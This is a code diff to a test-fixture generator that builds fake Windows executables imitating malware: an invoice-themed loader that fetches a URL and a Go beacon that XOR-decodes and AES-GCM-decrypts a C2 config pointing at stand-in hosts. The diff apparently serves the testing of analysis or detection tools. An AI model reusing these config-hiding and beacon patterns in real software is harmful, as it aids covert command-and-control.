@@ -2091,6 +2091,59 @@ def _go_pe(names: list[str], version: str = "go1.22.5") -> bytes:
 # callees, the URL string, the XOR loop and pseudocode. Nothing else in them.
 
 CODE_URL = "https://cdn-update.example.net/invoice/sync"
+CODE_XOR_KEY = 0xA5
+CODE_SECRET = b"sleep=60;jitter=15;id=INV-0413;x"              # 32 bytes, XOR-encoded in the samples
+CODE_BLOB = bytes(b ^ CODE_XOR_KEY for b in CODE_SECRET).decode("latin-1")
+# AES-256-GCM sealed config (fixed key / nonce so the sample is reproducible)
+CODE_GCM_KEY = bytes.fromhex("8f3a1c5e7b2d904e6a1f3c8b5d2e7a91c4f60b3e8d1a5c7f2e9b4d6a0c3f8e1b")
+CODE_GCM_NONCE = bytes.fromhex("5ac1e3f7092b4d6e8f1a3c5e")
+CODE_CONFIG = b'{"c2": "https://cdn-update.example.net/invoice/sync", "backup": "203.0.113.47:8443", "id": "INV-2026-0413"}'
+
+
+def _sealed() -> bytes:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    return AESGCM(CODE_GCM_KEY).encrypt(CODE_GCM_NONCE, CODE_CONFIG, None)
+
+
+CODE_SEALED = _sealed()
+
+
+def _aes_sbox() -> bytes:
+    """The AES S-box (as crypto/aes carries it), computed: inverse in GF(2^8) + affine map."""
+    def mul(a: int, b: int) -> int:
+        r = 0
+        while b:
+            if b & 1:
+                r ^= a
+            a = ((a << 1) ^ (0x11B if a & 0x80 else 0)) & 0xFF
+            b >>= 1
+        return r
+    inv = [0] * 256
+    for a in range(1, 256):
+        for b in range(1, 256):
+            if mul(a, b) == 1:
+                inv[a] = b
+                break
+    out = bytearray()
+    for x in range(256):
+        b = inv[x]
+        out.append(b ^ ((b << 1 | b >> 7) & 0xFF) ^ ((b << 2 | b >> 6) & 0xFF) ^ ((b << 3 | b >> 5) & 0xFF)
+                   ^ ((b << 4 | b >> 4) & 0xFF) ^ 0x63)
+    return bytes(out)
+
+
+def _sha256_k() -> bytes:
+    import math
+    import struct as _st
+
+    def primes(n: int) -> list[int]:
+        out, c = [], 2
+        while len(out) < n:
+            if all(c % p for p in out):
+                out.append(c)
+            c += 1
+        return out
+    return _st.pack("<64I", *(int((p ** (1 / 3) % 1) * (1 << 32)) & 0xFFFFFFFF for p in primes(64)))
 
 
 def _x64(ops: list) -> tuple[bytes, dict[str, int]]:
@@ -2131,8 +2184,8 @@ def _code_body(http_call: list) -> list:
         ("label", "decode"),
         b"\x31\xc0",                                              # xor eax, eax
         ("label", "dloop"),
-        b"\x8a\x14\x01\x80\xf2\x5a\x88\x14\x01",                 # mov dl,[rcx+rax]; xor dl,0x5a; mov [rcx+rax],dl
-        b"\x30\x54\x01\x01",                                      # xor [rcx+rax+1], dl
+        b"\x8a\x14\x01\x80\xf2" + bytes([CODE_XOR_KEY]) + b"\x88\x14\x01",   # mov dl,[rcx+rax]; xor dl,KEY; mov [rcx+rax],dl
+        b"\x0f\x1f\x40\x00",                                      # nop
         b"\x48\xff\xc0\x48\x83\xf8\x20\x72\xea",                 # inc rax; cmp rax,0x20; jb dloop
         b"\x48\x89\xc8\xc3",                                      # mov rax, rcx ; ret
         b"\xcc" * 2,
@@ -2158,7 +2211,7 @@ def code_loader_exe() -> bytes:
             b"\x45\x31\xc0\x45\x31\xc9",
             ("rip", "InternetOpenUrlA", b"\xff\x15")]             # call [InternetOpenUrlA]
     code, meta = _x64(_code_body(http))
-    blob = "\x1f\x2e\x3d\x4c" * 8
+    blob = CODE_BLOB
 
     def build(c: bytes) -> bytes:
         return bk.pe(bits=64, gui=False, imports=imports, code=c, strings=[CODE_URL, blob, "invoice sync"])
@@ -2168,7 +2221,7 @@ def code_loader_exe() -> bytes:
     rvas = {i.name.decode(): i.address - pe.OPTIONAL_HEADER.ImageBase for d in pe.DIRECTORY_ENTRY_IMPORT for i in d.imports}
     bf = binfmt.parse(first)
     rvas["url"] = bf.off_to_va(first.find(CODE_URL.encode())) - pe.OPTIONAL_HEADER.ImageBase
-    rvas["blob"] = bf.off_to_va(first.find(blob.encode())) - pe.OPTIONAL_HEADER.ImageBase
+    rvas["blob"] = bf.off_to_va(first.find(blob.encode("latin-1"))) - pe.OPTIONAL_HEADER.ImageBase
     text = next(sec for sec in pe.sections if sec.Name.rstrip(b"\x00") == b".text").VirtualAddress
     return build(_x64_link(code, meta, text, rvas))
 
@@ -2232,9 +2285,22 @@ def go_code_exe() -> bytes:
         ("label", "newproc"), b"\xc3", b"\xcc" * 15,
         ("label", "deferreturn"), b"\xc3", b"\xcc" * 15,
         ("label", "cfgload"), b"\xc3", b"\xcc" * 15,          # method main.(*Config).load (Types tab)
+        # main.openConfig: aes.NewCipher(key[:32]) → cipher.NewGCM → gcm.Open(nonce[:12], sealed)
+        ("label", "openconfig"),
+        b"\x48\x83\xec\x28",
+        ("rip", "gcmkey", b"\x48\x8d\x05"), b"\xbb" + _st.pack("<I", 32),        # lea rax,[key]; mov ebx,32
+        ("rel32", "newcipher", b"\xe8"),                                        # call crypto/aes.NewCipher
+        ("rel32", "newgcm", b"\xe8"),                                           # call crypto/cipher.NewGCM
+        ("rip", "gcmnonce", b"\x48\x8d\x05"), b"\xbb" + _st.pack("<I", 12),      # lea rax,[nonce]; mov ebx,12
+        ("rip", "sealed", b"\x48\x8d\x0d"), b"\xbf" + _st.pack("<I", len(CODE_SEALED)),  # lea rcx,[ct]; mov edi,len
+        ("rel32", "gcmopen", b"\xe8"),                                          # call crypto/cipher.(*gcm).Open
+        b"\x48\x83\xc4\x28\xc3", b"\xcc" * 3,
+        ("label", "newcipher"), b"\xc3", b"\xcc" * 15,
+        ("label", "newgcm"), b"\xc3", b"\xcc" * 15,
+        ("label", "gcmopen"), b"\xc3", b"\xcc" * 15,
         ("label", "end")]
     code, meta = _x64(body)
-    blob = "\x1f\x2e\x3d\x4c" * 8
+    blob = CODE_BLOB
     bid = b'\xff Go build ID: "Zq9xWv8uTs7rQp6oNm5l/Kj4iHg3fEd2cBa1zYx0w/Vu9tSr8qPo7nMl6kJi5h/Gf4eDc3bAa2zZy1xW"\n \xff'
     funcs = [("main.main", meta["main"], meta["decode"] - meta["main"]),
              ("main.decryptConfig", meta["decode"], meta["beacon"] - meta["decode"]),
@@ -2243,7 +2309,11 @@ def go_code_exe() -> bytes:
              ("net/http.(*Client).Do", meta["httpdo"], meta["newproc"] - meta["httpdo"]),
              ("runtime.newproc", meta["newproc"], meta["deferreturn"] - meta["newproc"]),
              ("runtime.deferreturn", meta["deferreturn"], meta["cfgload"] - meta["deferreturn"]),
-             ("main.(*Config).load", meta["cfgload"], meta["end"] - meta["cfgload"])]
+             ("main.(*Config).load", meta["cfgload"], meta["openconfig"] - meta["cfgload"]),
+             ("main.openConfig", meta["openconfig"], meta["newcipher"] - meta["openconfig"]),
+             ("crypto/aes.NewCipher", meta["newcipher"], meta["newgcm"] - meta["newcipher"]),
+             ("crypto/cipher.NewGCM", meta["newgcm"], meta["gcmopen"] - meta["newgcm"]),
+             ("crypto/cipher.(*gcm).Open", meta["gcmopen"], meta["end"] - meta["gcmopen"])]
     extra = [n for n in GO_STD if n not in ("net/http.(*Client).Do", "runtime.newproc")]
     base = 0x140000000                                              # binkit PE32+ image base, .text at RVA 0x1000
     text_va = base + 0x1000
@@ -2252,7 +2322,8 @@ def go_code_exe() -> bytes:
     def build(c: bytes, md: bytes, emb: bytes) -> bytes:
         # the URL is a Go string: bytes with no NUL, referenced by pointer + length
         return bk.pe(bits=64, gui=False, imports={"kernel32.dll": ["VirtualAlloc", "ExitProcess"]}, code=c,
-                     sections=[(".rdata", pcln + CODE_URL.encode() + blob.encode(), 0x40000040),
+                     sections=[(".rdata", pcln + CODE_URL.encode() + blob.encode("latin-1") + b"\x00" * 8
+                                + CODE_GCM_KEY + CODE_GCM_NONCE + CODE_SEALED + _aes_sbox() + _sha256_k(), 0x40000040),
                                (".data", _go_buildinfo("go1.22.5", "windows") + md, 0xC0000040),
                                (".embed", emb, 0x40000040)],
                      strings=[bid.decode("latin-1")])
@@ -2260,7 +2331,9 @@ def go_code_exe() -> bytes:
     bf = binfmt.parse(first)
     assert bf.section(".text").va == text_va
     rvas = {"url": bf.off_to_va(first.find(CODE_URL.encode())) - base,
-            "blob": bf.off_to_va(first.find(blob.encode())) - base}
+            "blob": bf.off_to_va(first.find(blob.encode("latin-1"))) - base}
+    for k, v in (("gcmkey", CODE_GCM_KEY), ("gcmnonce", CODE_GCM_NONCE), ("sealed", CODE_SEALED)):
+        rvas[k] = bf.off_to_va(first.find(v)) - base
     linked = _x64_link(code, meta, text_va - base, rvas)
     off = first.find(_st.pack("<I", 0xFFFFFFF1) + b"\x00\x00")
     va = bf.off_to_va(off) or 0
